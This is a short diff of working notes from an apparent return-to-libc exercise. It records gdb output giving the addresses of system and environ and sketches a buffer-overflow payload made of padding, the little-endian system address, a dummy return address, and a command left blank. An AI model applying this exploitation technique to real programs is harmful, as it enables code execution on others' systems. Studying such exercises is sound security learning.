@@ -11,7 +11,7 @@ We need to locate the entrypoint of the “system” function call and prepare t
 Steps:
 
 (gdb) display &system
-    &system = (<text variable, no debug info> *) 0xf7e3c940 <system>
+    &system = (<text variable, no debug info> *) 0xf7e3a940 <system>
 
 trying to run with the original returntolibc.bin shell code fails
 
@@ -46,9 +46,12 @@ the 7th group of bytes changes eip
 
 ???
 
-&system  = 0xf7e3c940
-&environ = 0xf7fb3dbc
+&system  = 0xf7e3a940
+&environ = 0xf7fb1dbc
 
+address of system probably goes at position 7 in the shell code
 
+structure of shell code: offset + &system + dummy address + command
 
+aaaaaaaaaaaaaaaaaaaaaaaa + 40 a9 e3 f7 + aaaa + ??
 
